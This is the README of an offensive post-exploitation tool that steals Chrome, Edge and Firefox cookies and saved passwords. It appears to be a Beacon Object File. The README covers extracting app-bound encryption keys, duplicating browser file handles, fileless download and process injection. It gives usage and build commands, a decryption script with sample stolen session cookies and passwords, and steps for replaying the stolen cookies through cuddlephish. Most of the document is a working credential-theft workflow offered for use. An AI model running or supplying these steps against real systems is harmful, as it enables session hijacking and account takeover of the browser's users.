# Cookie-Monster-BOF
Steal browser cookies for edge, chrome and firefox through a BOF!

Cookie Monster BOF will extract the WebKit Master Key and the App Bound Encryption Key for both Edge and Chrome, locate a browser process with a handle to the Cookies and Login Data files, copy the handle(s) and then filelessly download the target file(s).

Once the Cookies/Login Data file(s) are downloaded, the python decryption script can be used to extract those secrets! Firefox module will parse the profiles.ini and locate where the logins.json and key4.db files are located and download them. A seperate github repo is referenced for offline decryption.  

Chrome & Edge 127+ Updates: new chromium browser cookies (v20) use the app bound key to encrypt the cookies. As a result, this makes retrieving the app_bound_encrypted_key slightly more difficult. Thanks to [snovvcrash](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824) this process can be accomplished without having to escalate your privileges. The catch is your process must be running out of the web browser's application directory. i.e. must inject into Chrome/Edge or spawn a beacon from the same application directory as the browser. 

Latest update allows you to decrypt cookies as SYSTEM and without having to inject into the browser process! Shoutout to @sdemius for the discovering how to decrypt the Chrome's [PostProcessData](https://source.chromium.org/chromium/chromium/src/+/main:chrome/elevation_service/elevator.cc;l=216;bpv=1) function and @b1scoito [explanation](https://github.com/moonD4rk/HackBrowserData/issues/431#issuecomment-2606665195)!  
 
## BOF Usage
```
Usage: cookie-monster [--chrome || --edge || --system <Local State File Path> <PID> || --firefox || --chromeCookiePID <PID> || --chromeLoginDataPID <PID> || --edgeCookiePID <PID> || --edgeLoginDataPID <PID> ] [--cookie-only] [--key-only] [--login-data-only] [--copy-file C:\Folder\Location\] 
cookie-monster Examples: 
   cookie-monster --chrome 
   cookie-monster --edge
   cookie-monster --system "C:\Users\<USER>\AppData\Local\<BROWSER>\User Data\Local State" <PID> 
   cookie-moster --firefox 
   cookie-monster --chromeCookiePID <PID>
   cookie-monster --chromeLoginDataPID <PID> 
   cookie-monster --edgeCookiePID <PID> 
   cookie-monster --edgeLoginDataPID <PID> 
cookie-monster Options: 
    --chrome, looks at all running processes and handles, if one matches chrome.exe it copies the handle to cookies and then copies the file to the CWD 
    --edge, looks at all running processes and handles, if one matches msedge.exe it copies the handle to cookies and then copies the file to the CWD 
    --system, Decrypt chromium based browser app bound encryption key without injecting into browser. Requires path to Local State file and PID of a user process for impersonation 
    --firefox, looks for profiles.ini and locates the key4.db and logins.json file 
    --chromeCookiePID, if chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file 
    --chromeLoginDataPID, if chrome PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file   
    --edgeCookiePID, if edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file 
    --edgeLoginDataPID, if edge PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file  
    --key-only, only retrieve the app bound encryption key. Do not attempt to download the Cookie or Login Data files. 
    --cookie-only, only retrieve the Cookie file. Do not attempt to download Login Data file or retrieve app bound encryption key. 
    --login-data-only, only retrieve the Login Data file. Do not attempt to download Cookie file or retrieve app bound encryption key.  
    --copy-file, copies the Cookie and Login Data file to the folder specified. Does not use fileless retrieval method.   
```
## Compile BOF 
Ensure Mingw-w64 and make is installed on the linux prior to compiling.
```
make
```

## Decryption Steps
Install requirements
```
pip3 install -r requirements.txt
```

Usage
```
python3 decrypt.py -h                                                                                                                                                                      
usage: decrypt.py [-h] -k KEY -o {cookies,passwords,cookie-editor,cuddlephish,firefox} -f FILE

Decrypt Chromium cookies and passwords given a key and DB file

options:
  -h, --help            show this help message and exit
  -k KEY, --key KEY     Decryption key
  -o {cookies,passwords,cookie-editor,cuddlephish,firefox}, --option {cookies,passwords,cookie-editor,cuddlephish,firefox}
                        Option to choose
  -f FILE, --file FILE  Location of the database file
```

Examples:
Decrypt Chrome/Edge Cookies File
```
python .\decrypt.py -k "\xec\xfc...." -o cookies -f ChromeCookies.db

Results Example:
-----------------------------------
Host: .github.com
Path: /
Name: dotcom_user
Cookie: KingOfTheNOPs
Expires: Oct 28 2024 21:25:22

Host: github.com
Path: /
Name: user_session
Cookie: x123.....
Expires: Nov 11 2023 21:25:22
```

Decrypt Chrome/Edge Cookies File and save to json
```
python .\decrypt.py -k "\xec\xfc...." -o cookie-editor -f ChromeCookies.db
Results Example:
Cookies saved to 2025-04-11_18-06-10_cookies.json
```
Import cookies JSON file with https://cookie-editor.com/ 

Decrypt Chome/Edge Passwords File
```
python .\decrypt.py -k "\xec\xfc...." -o passwords ChromePasswords.db

Results Example:
-----------------------------------
URL: https://test.com/
Username: tester
Password: McTesty
```
Decrypt Firefox Cookies and Stored Credentials: <br>
https://github.com/lclevy/firepwd

### CuddlePhish Support
added cuddlephish option to the decrypt script which should support using the cookie with https://github.com/fkasler/cuddlephish

```
# Decrypt Cookies
python3 decrypt.py -k "\xec\xfc..." -o cuddlephish -f ChromeCookies.db

# Clone Project
cd 
git clone https://github.com/fkasler/cuddlephish
cd cuddlephish

# Install Dependencies Example on Debian 
curl -fsSL https://deb.nodesource.com/setup_23.x -o nodesource_setup.sh
sudo -E bash nodesource_setup.sh
sudo apt-get install nodejs
npm install

# Import Cookies
cp ~/cookie-monster/cuddlephish_YYYY-MM-DD_HH-MM-SS.json .
node stealer.js cuddlephish_YYYY-MM-DD_HH-MM-SS.json
```

## References
This project could not have been done without the help of Mr-Un1k0d3r and his amazing seasonal videos!
Highly recommend checking out his lessons!!! <br>
Cookie Webkit Master Key Extractor:
https://github.com/Mr-Un1k0d3r/Cookie-Graber-BOF <br>
Fileless download:
https://github.com/fortra/nanodump <br>
Decrypt Cookies and Login Data:
https://github.com/login-securite/DonPAPI <br>
App Bound Key Decryption:
https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824 <br>
Decrypt Chrome 130+ Cookies 
https://github.com/runassu/chrome_v20_decryption/issues/14#issuecomment-2708796234 <br>
